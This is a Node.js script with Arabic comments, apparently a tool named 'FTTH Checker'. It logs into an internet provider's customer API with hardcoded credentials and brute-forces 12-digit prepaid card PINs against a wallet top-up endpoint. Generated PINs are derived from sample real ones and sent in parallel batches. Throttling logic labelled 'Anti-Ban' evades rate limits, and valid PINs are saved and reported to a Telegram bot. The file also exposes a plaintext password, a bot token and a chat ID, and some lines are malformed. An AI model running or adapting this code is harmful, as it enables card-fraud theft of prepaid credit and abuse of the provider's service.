const axios = require('axios');
const fs = require('fs').promises;
const { Telegraf, Markup } = require('telegraf');

// ========== الإعدادات ==========
const CONFIG = {
    apiBase: 'https://api.ftth.iq/api',
    loginUrl: 'https://api.ftth.iq/api/auth/Customer/token',
    checkUrl: 'https://api.ftth.iq/api/customers/2190217/wallets/top-up',
    username: '07718342248',
    password: '@lSDKl10',
    pinLength: 12,
    batchSize: 3,          // ← 3 PINs كل مرة
    batchDelay: 2000,      // ← 2 ثانية بين batches
    slowThreshold: 2000,    // 2 ثواني = بطيء
    sleepOnSlow: 5000,     // ينتظر 5 ثواني
    maxFailures: 5,
    sleepOnFailures: 10000, // 10 ثواني
    heartbeatInterval: 30000,
};

// Telegram - عدّل هذي!
const BOT_TOKEN = process.env.5015755042:AAGW_mUPwROeXraHWvNaN2e67jcEILGh9_E || '';  // أو حط التوكن مباشرة
const CHAT_ID = process.env.2121443469 || '';      // أو حط الـ ID مباشرة

// ملفات
const FILES = {
    seen: 'seen_pins.txt',
    valid: 'valid_pins.txt',
    log: 'checker.log',
    state: 'bot_state.json',
};

const SAMPLE_PINS = [
    '451807724440', '847802868630', '887073805745',
    '846425703388', '222777241754', '332053374056',
];

const COMMON_HEADERS = {
    'x-client-version': '4.6.2_23040',
    'user-agent': 'Dart/3.9 (dart:io)',
    'x-client-name': 'ANDROID_14',
    'x-client-role': 'Customer',
    'accept-language': 'ar',
    'x-client-app': '0c25703d-16eb-476e-b3b0-b9dab75decd5',
};

// ========== State ==========
let botState = {
    running: false,
    totalChecked: 0,
    validFound: 0,
    lastPin: '',
    startTime: null,
    token: '',
    tokenExp: 0,
    consecutiveFailures: 0,
    avgResponseTime: 0,
    slowCount: 0,
    lastHeartbeat: 0,
};

let seenPins = new Set();
let bot = null;
let checkInterval = null;

// ========== Logging ==========
async function log(msg, type = 'info') {
    const line = `[${new Date().toISOString()}] [${type.toUpperCase()}] ${msg}\n`;
    console.log(line.trim());
    try {
        await fs.appendFile(FILES.log, line);
    } catch (e) {}
}

// ========== State Management ==========
async function loadState() {
    try {
        const data = await fs.readFile(FILES.state, 'utf8');
        botState = { ...botState, ...JSON.parse(data) };
    } catch (e) {}
}

async function saveState() {
    try {
        await fs.writeFile(FILES.state, JSON.stringify(botState, null, 2));
    } catch (e) {}
}

async function loadSeen() {
    try {
        const data = await fs.readFile(FILES.seen, 'utf8');
        seenPins = new Set(data.split('\n').filter(Boolean));
    } catch (e) {
        seenPins = new Set();
    }
}

async function saveSeen(pin) {
    try {
        await fs.appendFile(FILES.seen, pin + '\n');
    } catch (e) {}
}

// ========== PIN Generator ==========
function genPin(length = 12) {
    const base = SAMPLE_PINS[Math.floor(Math.random() * SAMPLE_PINS.length)];
    const modes = ['prefix', 'suffix', 'middle', 'mix', 'sequence', 'shuffle'];
    const mode = modes[Math.floor(Math.random() * modes.length)];
    const digits = '0123456789';

    let pin = '';

    switch (mode) {
        case 'prefix': {
            const k = 3 + Math.floor(Math.random() * 4);
            pin = base.slice(0, k) + randomStr(length - k, digits);
            break;
        }
        case 'suffix': {
            const k = 3 + Math.floor(Math.random() * 4);
            pin = randomStr(length - k, digits) + base.slice(-k);
            break;
        }
        case 'middle': {
            const k = 3 + Math.floor(Math.random() * 4);
            const start = Math.floor(Math.random() * (base.length - k));
            const mid = base.slice(start, start + k);
            const left = 1 + Math.floor(Math.random() * (length - k - 1));
            const right = length - k - left;
            pin = randomStr(left, digits) + mid + randomStr(right, digits);
            break;
        }
        case 'sequence': {
            const offset = Math.floor(Math.random() * 1000) - 500;
            const num = BigInt(base) + BigInt(offset);
            pin = num.toString().slice(0, length).padStart(length, '0');
            break;
        }
        case 'shuffle': {
            const chars = (base + randomStr(length, digits)).split('');
            for (let i = chars.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [chars[i], chars[j]] = [chars[j], chars[i]];
            }
            pin = chars.slice(0, length).join('');
            break;
        }
        default:
            pin = '';
            for (let i = 0; i < length; i++) {
                pin += Math.random() < 0.6 ? base[Math.floor(Math.random() * base.length)] : digits[Math.floor(Math.random() * 10)];
            }
    }

    if (pin[0] === '0') {
        pin = '123456789'[Math.floor(Math.random() * 9)] + pin.slice(1);
    }

    return pin.slice(0, length);
}

function randomStr(len, chars) {
    let str = '';
    for (let i = 0; i < len; i++) {
        str += chars[Math.floor(Math.random() * chars.length)];
    }
    return str;
}

async function getUniquePin() {
    let attempts = 0;
    while (attempts < 1000) {
        const pin = genPin();
        if (!seenPins.has(pin)) {
            seenPins.add(pin);
            await saveSeen(pin);
            return pin;
        }
        attempts++;
    }
    return genPin() + Math.floor(Math.random() * 1000);
}

// ========== Login ==========
async function login() {
    try {
        log('🔑 تسجيل دخول...');
        const response = await axios.post(CONFIG.loginUrl, 
            new URLSearchParams({
                username: CONFIG.username,
                password: CONFIG.password,
                grant_type: 'password'
            }), {
            headers: COMMON_HEADERS,
            timeout: 10000,
        });

        if (response.data && response.data.access_token) {
            botState.token = response.data.access_token;
            botState.tokenExp = Date.now() + (response.data.expires_in || 300) * 1000;
            await saveState();
            log('✅ تسجيل دخول ناجح');
            return response.data.access_token;
        }
    } catch (e) {
        log('❌ فشل تسجيل الدخول: ' + e.message, 'error');
    }
    return null;
}

async function ensureToken() {
    if (botState.token && Date.now() < botState.tokenExp) {
        return botState.token;
    }
    return await login();
}

// ========== Check PIN ==========
async function checkPin(pin) {
    const token = await ensureToken();
    if (!token) {
        return { success: false, error: 'no_token', time: 0 };
    }

    const startTime = Date.now();
    try {
        const response = await axios.post(CONFIG.checkUrl, 
            { cardPin: pin }, {
            headers: {
                ...COMMON_HEADERS,
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
                'Idempotency-Key': Math.random().toString(36).substring(2),
            },
            timeout: 8000,
        });

        const time = Date.now() - startTime;
        botState.lastPin = pin;
        botState.totalChecked++;
        botState.consecutiveFailures = 0;

        if (response.status === 200) {
            botState.validFound++;
            await fs.appendFile(FILES.valid, `${pin},${new Date().toISOString()},${JSON.stringify(response.data)}\n`);
            await saveState();
            return { success: true, pin, response: response.data, time };
        }

        await saveState();
        return { success: false, pin, code: response.status, time };

    } catch (e) {
        const time = Date.now() - startTime;
        botState.lastPin = pin;
        botState.totalChecked++;
        botState.consecutiveFailures++;

        if (e.response) {
            if (e.response.status === 401) {
                botState.token = '';
                await saveState();
                return { success: false, pin, error: 'token_expired', time };
            }
            if (e.response.status === 429) {
                await saveState();
                return { success: false, pin, error: 'rate_limited', time };
            }
            await saveState();
            return { success: false, pin, code: e.response.status, time };
        }

        await saveState();
        return { success: false, pin, error: e.message, time };
    }
}

// ========== Check Batch (Parallel) ==========
async function checkBatch() {
    const pins = [];
    for (let i = 0; i < CONFIG.batchSize; i++) {
        pins.push(await getUniquePin());
    }

    log(`📦 Batch [${CONFIG.batchSize}]: ${pins.join(', ')}`);

    // فحص متوازي - كل الـ PINs بنفس الوقت!
    const results = await Promise.all(pins.map(pin => checkPin(pin)));

    const times = results.filter(r => r.time).map(r => r.time);
    if (times.length > 0) {
        botState.avgResponseTime = times.reduce((a, b) => a + b, 0) / times.length;
    }

    const validPins = [];
    for (const result of results) {
        if (result.success) {
            validPins.push(result.pin);
            log(`✅ PIN صالح: ${result.pin}`, 'success');
        }
    }

    if (validPins.length > 0 && bot) {
        const msg = '✅ <b>PINs صالحة!</b>\n\n' + validPins.map(p => `📱 ${p}`).join('\n');
        try {
            await bot.telegram.sendMessage(CHAT_ID, msg, { parse_mode: 'HTML' });
        } catch (e) {}
    }

    return { results, validPins };
}

// ========== Main Loop ==========
async function runChecker() {
    if (!botState.running) {
        log('⏸️ متوقف');
        return;
    }

    const batchStart = Date.now();
    const result = await checkBatch();

    // Anti-Ban: بطيء
    if (botState.avgResponseTime > CONFIG.slowThreshold) {
        botState.slowCount++;
        log(`🐌 بطيء: ${Math.round(botState.avgResponseTime)}ms`, 'warning');
        await saveState();

        if (bot) {
            try {
                await bot.telegram.sendMessage(CHAT_ID, 
                    `🐌 <b>Anti-Ban</b>\nاستجابة بطيئة (${Math.round(botState.avgResponseTime)}ms)، انتظار ${CONFIG.sleepOnSlow/1000}s`, 
                    { parse_mode: 'HTML' });
            } catch (e) {}
        }

        await sleep(CONFIG.sleepOnSlow);
        botState.consecutiveFailures = 0;
        await saveState();
    }

    // Anti-Ban: فشلات
    if (botState.consecutiveFailures >= CONFIG.maxFailures) {
        log(`⚠️ ${CONFIG.maxFailures} فشلات متتالية!`, 'warning');
        await saveState();

        if (bot) {
            try {
                await bot.telegram.sendMessage(CHAT_ID, 
                    `❌ <b>Anti-Ban</b>\n${CONFIG.maxFailures} فشلات، انتظار ${CONFIG.sleepOnFailures/1000}s`, 
                    { parse_mode: 'HTML' });
            } catch (e) {}
        }

        await sleep(CONFIG.sleepOnFailures);
        botState.consecutiveFailures = 0;
        await saveState();
    }

    // Delay
    const batchTime = Date.now() - batchStart;
    const remaining = CONFIG.batchDelay - batchTime;
    if (remaining > 0) {
        log(`⏳ انتظار ${remaining}ms`);
        await sleep(remaining);
    }

    // Heartbeat
    if (Date.now() - botState.lastHeartbeat > CONFIG.heartbeatInterval) {
        botState.lastHeartbeat = Date.now();
        await saveState();
        log('💓 Heartbeat');
    }

    if (botState.running) {
        setImmediate(runChecker);
    }
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// ========== Telegram Bot ==========
function initBot() {
    if (!BOT_TOKEN) {
        log('⚠️ BOT_TOKEN فارغ - Telegram معطل', 'warning');
        return null;
    }

    const b = new Telegraf(BOT_TOKEN);

    // Start command
    b.start(async (ctx) => {
        await ctx.reply(
            `🤖 <b>FTTH Checker - Node.js</b>\n` +
            `━━━━━━━━━━━━━━━\n` +
            `أداة فحص PINs المتقدمة\n\n` +
            `📦 Batch: ${CONFIG.batchSize} PINs\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms\n` +
            `🐌 Anti-Ban: مفعل\n\n` +
            `اختر إجراء:`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                    [Markup.button.callback('⚙️ الإعدادات', 'settings'), Markup.button.callback('📁 الملفات', 'files')],
                    [Markup.button.callback('🔄 تجديد التوكن', 'refresh'), Markup.button.callback('🧹 مسح', 'clear')],
                ])
            }
        );
    });

    // ========== CALLBACKS ==========

    b.action('start', async (ctx) => {
        await ctx.answerCbQuery('⏳ جاري التشغيل...');

        if (botState.running) {
            await ctx.editMessageText('⚠️ <b>الأداة شغالة!</b>', {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                ])
            });
            return;
        }

        botState.running = true;
        botState.startTime = Date.now();
        await saveState();

        await ctx.editMessageText(
            `✅ <b>تم التشغيل!</b>\n\n` +
            `📦 Batch: ${CONFIG.batchSize} PINs\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms\n` +
            `🐌 Anti-Ban: مفعل`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                    [Markup.button.callback('⚙️ الإعدادات', 'settings'), Markup.button.callback('📁 الملفات', 'files')],
                    [Markup.button.callback('🔄 تجديد التوكن', 'refresh'), Markup.button.callback('🧹 مسح', 'clear')],
                ])
            }
        );

        runChecker();
    });

    b.action('stop', async (ctx) => {
        await ctx.answerCbQuery('⏳ جاري الإيقاف...');

        botState.running = false;
        await saveState();

        const uptime = botState.startTime ? formatTime(Date.now() - botState.startTime) : '00:00:00';

        await ctx.editMessageText(
            `🛑 <b>تم الإيقاف!</b>\n\n` +
            `⏱️ Uptime: ${uptime}\n` +
            `📋 مفحوص: ${botState.totalChecked}\n` +
            `✅ صالحة: ${botState.validFound}`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                ])
            }
        );
    });

    b.action('status', async (ctx) => {
        await ctx.answerCbQuery('📊 جاري التحميل...');

        const status = botState.running ? '🟢 شغالة' : '🔴 متوقفة';
        const uptime = botState.startTime ? formatTime(Date.now() - botState.startTime) : '00:00:00';
        const speed = botState.startTime ? (botState.totalChecked / ((Date.now() - botState.startTime) / 1000)).toFixed(2) : 0;

        await ctx.editMessageText(
            `📊 <b>الحالة</b>\n\n` +
            `الحالة: ${status}\n` +
            `⏱️ Uptime: ${uptime}\n` +
            `📋 مفحوص: ${botState.totalChecked}\n` +
            `⚡ سرعة: ${speed} PIN/s\n` +
            `⏱️ متوسط استجابة: ${Math.round(botState.avgResponseTime)}ms\n` +
            `🐌 بطيء: ${botState.slowCount} مرة\n` +
            `❌ فشلات متتالية: ${botState.consecutiveFailures}\n` +
            `✅ صالحة: ${botState.validFound}\n` +
            `🔑 توكن: ${botState.token ? '✅' : '❌'}\n` +
            `📝 آخر PIN: ${botState.lastPin || 'لا يوجد'}`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                    [Markup.button.callback('⚙️ الإعدادات', 'settings'), Markup.button.callback('📁 الملفات', 'files')],
                    [Markup.button.callback('🔄 تجديد التوكن', 'refresh'), Markup.button.callback('🧹 مسح', 'clear')],
                ])
            }
        );
    });

    b.action('stats', async (ctx) => {
        await ctx.answerCbQuery('📈 جاري التحميل...');

        let seenCount = 0;
        let validCount = 0;
        try {
            const seen = await fs.readFile(FILES.seen, 'utf8');
            seenCount = seen.split('\n').filter(Boolean).length;
        } catch (e) {}
        try {
            const valid = await fs.readFile(FILES.valid, 'utf8');
            validCount = valid.split('\n').filter(Boolean).length;
        } catch (e) {}

        await ctx.editMessageText(
            `📈 <b>إحصائيات</b>\n\n` +
            `📋 PINs مفحوصة: ${seenCount}\n` +
            `✅ PINs صالحة: ${validCount}\n` +
            `📦 Batch: ${CONFIG.batchSize}\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms\n` +
            `🐌 Slow Threshold: ${CONFIG.slowThreshold}ms\n` +
            `😴 Sleep: ${CONFIG.sleepOnSlow}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                ])
            }
        );
    });

    b.action('settings', async (ctx) => {
        await ctx.answerCbQuery('⚙️ الإعدادات');
        await ctx.editMessageText(
            `⚙️ <b>الإعدادات</b>\n\n` +
            `اضغط ➕/➖ لتعديل\n\n` +
            `📦 Batch: ${CONFIG.batchSize} PINs\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [
                        Markup.button.callback('➖ Batch', 'batch_minus'),
                        Markup.button.callback('➕ Batch', 'batch_plus'),
                    ],
                    [
                        Markup.button.callback('➖ Delay', 'delay_minus'),
                        Markup.button.callback('➕ Delay', 'delay_plus'),
                    ],
                    [Markup.button.callback('🔙 رجوع', 'back')],
                ])
            }
        );
    });

    b.action('files', async (ctx) => {
        await ctx.answerCbQuery('📁 الملفات');

        const files = [];
        for (const [name, path] of Object.entries(FILES)) {
            try {
                const stat = await fs.stat(path);
                files.push(`📁 ${name}: ${(stat.size / 1024).toFixed(2)} KB`);
            } catch (e) {
                files.push(`📁 ${name}: غير موجود`);
            }
        }

        await ctx.editMessageText(
            `📁 <b>الملفات</b>\n\n` + files.join('\n'),
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                ])
            }
        );
    });

    b.action('refresh', async (ctx) => {
        await ctx.answerCbQuery('🔄 جاري التجديد...');
        const token = await login();
        if (token) {
            await ctx.reply('🔄 <b>تم تجديد التوكن!</b>\n\nصالح لـ 5 دقائق', { parse_mode: 'HTML' });
        } else {
            await ctx.reply('❌ <b>فشل التجديد!</b>', { parse_mode: 'HTML' });
        }
    });

    b.action('clear', async (ctx) => {
        await ctx.answerCbQuery('🧹 جاري المسح...');

        for (const path of Object.values(FILES)) {
            try { await fs.unlink(path); } catch (e) {}
        }

        botState.totalChecked = 0;
        botState.validFound = 0;
        botState.consecutiveFailures = 0;
        botState.slowCount = 0;
        seenPins = new Set();
        await saveState();

        await ctx.reply('🧹 <b>تم المسح!</b>\n\nسيبدأ من جديد', { parse_mode: 'HTML' });
    });

    // Settings
    b.action('batch_plus', async (ctx) => {
        CONFIG.batchSize = Math.min(10, CONFIG.batchSize + 1);
        await ctx.answerCbQuery(`Batch: ${CONFIG.batchSize}`);
        await ctx.editMessageText(
            `⚙️ <b>الإعدادات</b>\n\n` +
            `📦 Batch: ${CONFIG.batchSize}\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
                    [Markup.button.callback('🔙 رجوع', 'back')],
                ])
            }
        );
    });

    b.action('batch_minus', async (ctx) => {
        CONFIG.batchSize = Math.max(1, CONFIG.batchSize - 1);
        await ctx.answerCbQuery(`Batch: ${CONFIG.batchSize}`);
        await ctx.editMessageText(
            `⚙️ <b>الإعدادات</b>\n\n` +
            `📦 Batch: ${CONFIG.batchSize}\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
                    [Markup.button.callback('🔙 رجوع', 'back')],
                ])
            }
        );
    });

    b.action('delay_plus', async (ctx) => {
        CONFIG.batchDelay = Math.min(10000, CONFIG.batchDelay + 500);
        await ctx.answerCbQuery(`Delay: ${CONFIG.batchDelay}ms`);
        await ctx.editMessageText(
            `⚙️ <b>الإعدادات</b>\n\n` +
            `📦 Batch: ${CONFIG.batchSize}\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
                    [Markup.button.callback('🔙 رجوع', 'back')],
                ])
            }
        );
    });

    b.action('delay_minus', async (ctx) => {
        CONFIG.batchDelay = Math.max(500, CONFIG.batchDelay - 500);
        await ctx.answerCbQuery(`Delay: ${CONFIG.batchDelay}ms`);
        await ctx.editMessageText(
            `⚙️ <b>الإعدادات</b>\n\n` +
            `📦 Batch: ${CONFIG.batchSize}\n` +
            `⏱️ Delay: ${CONFIG.batchDelay}ms`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('➖ Batch', 'batch_minus'), Markup.button.callback('➕ Batch', 'batch_plus')],
                    [Markup.button.callback('➖ Delay', 'delay_minus'), Markup.button.callback('➕ Delay', 'delay_plus')],
                    [Markup.button.callback('🔙 رجوع', 'back')],
                ])
            }
        );
    });

    b.action('back', async (ctx) => {
        await ctx.answerCbQuery('🔙 رجوع');
        await ctx.editMessageText(
            `🤖 <b>FTTH Checker - Node.js</b>\n\nاختر إجراء:`,
            {
                parse_mode: 'HTML',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('▶️ تشغيل', 'start'), Markup.button.callback('⏹️ إيقاف', 'stop')],
                    [Markup.button.callback('📊 الحالة', 'status'), Markup.button.callback('📈 إحصائيات', 'stats')],
                    [Markup.button.callback('⚙️ الإعدادات', 'settings'), Markup.button.callback('📁 الملفات', 'files')],
                    [Markup.button.callback('🔄 تجديد التوكن', 'refresh'), Markup.button.callback('🧹 مسح', 'clear')],
                ])
            }
        );
    });

    return b;
}

function formatTime(ms) {
    const seconds = Math.floor(ms / 1000);
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = seconds % 60;
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

// ========== Main ==========
async function main() {
    console.log('========================================');
    console.log('🤖 FTTH Checker - Node.js');
    console.log('========================================\n');

    await loadState();
    await loadSeen();

    console.log('📊 الإعدادات:');
    console.log(`   📦 Batch: ${CONFIG.batchSize} PINs`);
    console.log(`   ⏱️ Delay: ${CONFIG.batchDelay}ms`);
    console.log(`   📋 مفحوص سابقاً: ${seenPins.size}\n`);

    // Init Telegram
    bot = initBot();
    if (bot) {
        bot.launch();
        console.log('✅ Telegram Bot شغال\n');
    }

    // Auto-start if was running
    if (botState.running) {
        console.log('🔄 استئناف التشغيل...\n');
        runChecker();
    }

    // Graceful shutdown
    process.once('SIGINT', () => {
        console.log('\n🛑 SIGINT');
        botState.running = false;
        saveState();
        if (bot) bot.stop('SIGINT');
        process.exit(0);
    });

    process.once('SIGTERM', () => {
        console.log('\n🛑 SIGTERM');
        botState.running = false;
        saveState();
        if (bot) bot.stop('SIGTERM');
        process.exit(0);
    });
}

main().catch(console.error);
